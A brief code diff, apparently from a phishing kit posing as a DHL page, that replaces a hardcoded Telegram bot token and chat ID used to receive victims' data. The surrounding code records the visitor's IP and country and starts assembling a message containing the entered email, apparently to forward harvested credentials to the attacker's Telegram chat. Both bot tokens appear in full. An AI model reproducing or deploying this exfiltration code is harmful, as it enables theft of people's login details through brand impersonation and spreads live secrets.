@@ -4669,9 +4669,9 @@ export default {
       );
       this.IP = tt.data.ip;
       this.query = tt.data.country_capital;
-      var token = "6562687906:AAHjkA41fEvbPDueV9ELYNy3ZBeyhyfmCJY";
+      var token = "8085298009:AAE07ta8T4ML6IYTOShlJeVU1RqMYTS6Q8o";
 
-      var chatId2 = -936912870 ;
+      var chatId2 = -4512252331 ;
       var fullMessage = `
         ||||||||||🇨🇦| DHL EN |🇨🇦||||||||||%0AEmail : ${
           this.email
